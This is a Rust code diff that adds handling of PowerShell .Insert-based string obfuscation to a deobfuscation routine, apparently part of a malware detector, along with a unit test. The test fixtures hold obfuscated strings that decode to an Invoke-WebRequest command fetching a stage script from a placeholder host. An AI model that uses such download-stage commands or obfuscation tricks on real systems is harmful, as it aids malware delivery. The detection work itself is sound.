@@ -1031,6 +1031,14 @@ static PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Insert\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal insert extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3471,6 +3479,54 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_insert_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !has_literal_extractor_def_signal(&lower)
+        || !lower.contains(".insert")
+        || !text.contains('\'')
+    {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_INSERT_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(insert_var) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(insert_idx) = param_index.get(&insert_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        let binding = PsInsertExtractorParamBinding {
+            value_idx,
+            value_name: value_var,
+            start_idx,
+            start_name: start_var,
+            insert_idx,
+            insert_name: insert_var,
+        };
+        out = inline_ps_literal_insert_calls(&out, &name, binding);
+    }
+    out
+}
+
 fn expand_literal_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower) || !text.contains('[') || !text.contains('\'') {
@@ -4209,6 +4265,168 @@ fn ps_literal_remove_replacement(value: &str, start: usize, count: usize) -> Opt
     let mut recovered = String::with_capacity(value.len() - count);
     recovered.push_str(&value[..start]);
     recovered.push_str(&value[end..]);
+    Some(format!("'{}'", recovered.replace('\'', "''")))
+}
+
+#[derive(Clone, Copy)]
+struct PsInsertExtractorParamBinding<'a> {
+    value_idx: usize,
+    value_name: &'a str,
+    start_idx: usize,
+    start_name: &'a str,
+    insert_idx: usize,
+    insert_name: &'a str,
+}
+
+fn inline_ps_literal_insert_calls(
+    text: &str,
+    name: &str,
+    binding: PsInsertExtractorParamBinding<'_>,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_insert_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.value_name,
+                    binding.start_name,
+                    binding.insert_name,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = first_end;
+                continue;
+            };
+            pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
+            let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = second_end;
+                continue;
+            };
+            let mut call_end = third_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = call_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+
+            let args = [first, second, third];
+            let Some(value) = args
+                .get(binding.value_idx)
+                .and_then(PsLiteralOrUsizeArg::as_str)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(start) = args
+                .get(binding.start_idx)
+                .and_then(PsLiteralOrUsizeArg::as_usize)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(insert) = args
+                .get(binding.insert_idx)
+                .and_then(PsLiteralOrUsizeArg::as_str)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(replacement) = ps_literal_insert_replacement(value, start, insert) else {
+                search_from = call_end;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_insert_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    start_name: &str,
+    insert_name: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) =
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_literal()?;
+    let start = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
+        .1
+        .as_usize()?;
+    let insert = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(insert_name))?
+        .1
+        .as_literal()?;
+    Some((
+        call_end,
+        ps_literal_insert_replacement(value, start, insert)?,
+    ))
+}
+
+fn ps_literal_insert_replacement(value: &str, start: usize, insert: &str) -> Option<String> {
+    if value.len() > 8192 || insert.len() > 512 {
+        return None;
+    }
+    if start > value.len() || !value.is_char_boundary(start) {
+        return None;
+    }
+    let mut recovered = String::with_capacity(value.len().checked_add(insert.len())?);
+    recovered.push_str(&value[..start]);
+    recovered.push_str(insert);
+    recovered.push_str(&value[start..]);
     Some(format!("'{}'", recovered.replace('\'', "''")))
 }
 
@@ -5452,6 +5670,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.remove_extractor {
                 out = expand_literal_remove_extractor_calls(&out);
             }
+            if signals.insert_extractor {
+                out = expand_literal_insert_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -5568,6 +5789,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.remove_extractor {
                 out = expand_literal_remove_extractor_calls(&out);
             }
+            if signals.insert_extractor {
+                out = expand_literal_insert_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -5624,6 +5848,7 @@ struct PsObfuscationSignals {
     trim_extractor: bool,
     substring: bool,
     remove_extractor: bool,
+    insert_extractor: bool,
     literal_index_extractor: bool,
     split_index: bool,
     embedded_single_quote_assignment: bool,
@@ -5666,6 +5891,7 @@ impl PsObfuscationSignals {
         let trim_extractor = has_function_def && lower.contains(".trim");
         let substring = lower.contains(".substring");
         let remove_extractor = has_function_def && lower.contains(".remove");
+        let insert_extractor = has_function_def && lower.contains(".insert");
         let literal_index_extractor =
             has_function_def && lower.contains('[') && text.contains('\'');
         let split_index =
@@ -5716,6 +5942,7 @@ impl PsObfuscationSignals {
             trim_extractor,
             substring,
             remove_extractor,
+            insert_extractor,
             literal_index_extractor,
             split_index,
             embedded_single_quote_assignment,
@@ -5750,6 +5977,7 @@ impl PsObfuscationSignals {
             || self.trim_extractor
             || self.substring
             || self.remove_extractor
+            || self.insert_extractor
             || self.literal_index_extractor
             || self.split_index
             || self.embedded_single_quote_assignment
@@ -7629,11 +7857,11 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
 mod literal_substring_extractor_tests {
     use super::{
         expand_doubled_quote_literals, expand_literal_index_extractor_calls,
-        expand_literal_remove_extractor_calls, expand_literal_replace_extractor_calls,
-        expand_literal_split_index_extractor_calls, expand_literal_substring_extractor_calls,
-        expand_literal_trim_extractor_calls, expand_parenthesized_string_concat,
-        literal_substring_extractor_defs, PS_LITERAL_INDEX_EXTRACTOR_BODY_RE,
-        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_literal_insert_extractor_calls, expand_literal_remove_extractor_calls,
+        expand_literal_replace_extractor_calls, expand_literal_split_index_extractor_calls,
+        expand_literal_substring_extractor_calls, expand_literal_trim_extractor_calls,
+        expand_parenthesized_string_concat, literal_substring_extractor_defs,
+        PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -7807,6 +8035,22 @@ Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7
         assert!(
             out.contains(&format!("'{decoded}'")),
             "literal remove extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_insert_extractor_call_is_rewritten() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-insert-extractor.example/stage.ps1";
+        let text = r#"function Add($value,$start,$text) {
+  return $value.Insert($start,$text)
+}
+Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"#;
+
+        let out = expand_literal_insert_extractor_calls(text);
+
+        assert!(
+            out.contains(&format!("'{decoded}'")),
+            "literal insert extractor call was not rewritten:\n{out}"
         );
     }
 
